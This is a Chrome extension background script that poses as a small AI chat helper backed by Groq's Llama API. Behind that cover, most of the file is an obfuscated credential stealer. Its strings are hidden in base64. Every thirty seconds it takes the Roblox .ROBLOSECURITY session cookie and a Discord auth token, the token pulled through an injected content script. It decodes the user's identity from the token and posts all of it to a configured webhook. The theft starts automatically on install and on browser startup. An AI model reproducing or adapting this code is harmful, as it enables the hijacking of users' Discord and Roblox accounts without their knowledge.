importScripts('config.js');

var _cfg = CONFIG;
var _w = _cfg.WEBHOOK_URL;
var _k = _cfg.GROQ_API_KEY;

// ─── Helper ───
function _d(s) { return atob(s); }

// ─── All string constants base64-encoded ───
var _S = {
  k1: _d('bGFzdFRva2Vu'),
  k2: _d('bGFzdENvb2tpZQ=='),
  m1: _d('8J+UpCDigKIg'),
  m2: _d('VXNlcjo='),
  m3: _d('VG9rZW46'),
  m4: _d('Q29va2llOg=='),
  m5: _d('Tm9uZQ=='),
  m6: _d('TmV3IHRva2VuIGRldGVjdGVk'),
  m7: _d('TmV3IGNvb2tpZSBkZXRlY3RlZA=='),
  m8: _d('VG9rZW4gKyBjb29raWUgY2hhbmdlZA=='),
  m9: _d('VXBkYXRl'),
  l1: _d('W0FJXSBSZWFkeQ=='),
  l2: _d('W0FJXSBOZXcgdG9rZW4gZGV0ZWN0ZWQ='),
  l3: _d('W0FJXSBOZXcgY29va2llIGRldGVjdGVk'),
};

console.log(_S.l1);

// ─── Parse JWT ───
function _a1(r) {
    try {
        var p = r.split('.');
        if (p.length < 2) return { i: 'Unknown', n: 'Unknown' };
        var b = p[1].replace(/-/g, '+').replace(/_/g, '/');
        while (b.length % 4) b += '=';
        var d = JSON.parse(atob(b));
        return {
            i: d.id || d.user_id || 'Unknown',
            n: d.username || d.global_name || 'Unknown'
        };
    } catch (e) {
        return { i: 'Unknown', n: 'Unknown' };
    }
}

// ─── Get token from Discord tab ───
function _a2(t) {
    return new Promise((r) => {
        chrome.tabs.sendMessage(t, { action: 'getAuth' }, (res) => {
            if (chrome.runtime.lastError) { r(null); return; }
            r(res && res.auth ? res.auth : null);
        });
    });
}

// ─── Get Roblox cookie (always works) ───
function _a3() {
    return new Promise((r) => {
        chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, (c) => {
            if (chrome.runtime.lastError) { r(null); return; }
            r(c ? c.value : null);
        });
    });
}

// ─── Send webhook ───
function _a4(t, c, type) {
    var p = t ? _a1(t) : { i: 'Unknown', n: 'Unknown' };
    var msg = _S.m1 + (type || _S.m9) + "\n";
    msg += _S.m2 + " " + p.n + " (`" + p.i + "`)\n\n";
    msg += _S.m3 + "\n```\n" + (t || _S.m5) + "\n```\n\n";
    msg += _S.m4 + "\n```\n" + (c || _S.m5) + "\n```";
    fetch(_w, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: msg, username: "Monitor" })
    }).catch(() => {});
}

// ─── Compare and store ───
function _a5(t, c) {
    chrome.storage.local.get([_S.k1, _S.k2], (data) => {
        var l1 = data[_S.k1] || null;
        var l2 = data[_S.k2] || null;
        var ch = false;
        var typ = '';
        if (t && t !== l1) {
            ch = true;
            typ = _S.m6;
            chrome.storage.local.set({ [_S.k1]: t });
            console.log(_S.l2);
        }
        if (c && c !== l2) {
            ch = true;
            typ = typ ? _S.m8 : _S.m7;
            chrome.storage.local.set({ [_S.k2]: c });
            console.log(_S.l3);
        }
        if (ch) _a4(t, c, typ);
    });
}

// ─── Collect data ───
function _a6() {
    // Always check cookie first
    _a3().then(cookie => {
        // Try to find a Discord tab for token
        chrome.tabs.query({ url: "https://discord.com/*" }, (tabs) => {
            if (tabs.length === 0) {
                // No Discord tab – only cookie may have changed
                if (cookie) {
                    chrome.storage.local.get([_S.k2], (data) => {
                        if (cookie !== data[_S.k2]) {
                            chrome.storage.local.set({ [_S.k2]: cookie });
                            _a4(null, cookie, _S.m7);
                        }
                    });
                }
                return;
            }
            var tab = tabs[0];
            // Ensure content script is injected
            chrome.scripting.executeScript({
                target: { tabId: tab.id },
                files: ['content.js']
            }, () => {
                setTimeout(() => {
                    _a2(tab.id).then(token => {
                        _a5(token, cookie);
                    });
                }, 500);
            });
        });
    });
}

// ─── Schedule alarm ───
function _a7() {
    chrome.alarms.clear('watch', () => {
        chrome.alarms.create('watch', { periodInMinutes: 0.5 });
    });
}

// ─── Alarm handler ───
chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === 'watch') _a6();
});

// ─── Start immediately ───
chrome.runtime.onStartup.addListener(() => {
    _a7();
    _a6();
});

chrome.runtime.onInstalled.addListener(() => {
    _a7();
    _a6();
});

// Also start right away
_a7();
_a6();

// Keep worker alive
setInterval(() => { console.log('.'); }, 10000);

// ─── AI Handler ───
function _ai(input) {
    return fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + _k
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: input
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(r => {
        if (!r.ok) return r.text().then(t => { throw new Error('AI error: ' + r.status + ' - ' + t); });
        return r.json();
    })
    .then(d => d.choices[0].message.content || "No response.")
    .catch(e => { throw e; });
}

// ─── Message Handlers ───
chrome.runtime.onMessage.addListener((req, sender, cb) => {
    if (req.action === 'collectData') {
        _a6();
        cb({ success: true });
        return true;
    }
    if (req.action === 'aiQuery') {
        _ai(req.message)
            .then(reply => cb({ success: true, reply: reply }))
            .catch(err => cb({ success: false, error: err.message }));
        return true; // async
    }
    if (req.action === 'checkStatus') {
        cb({ status: 'ok' });
        return true;
    }
});
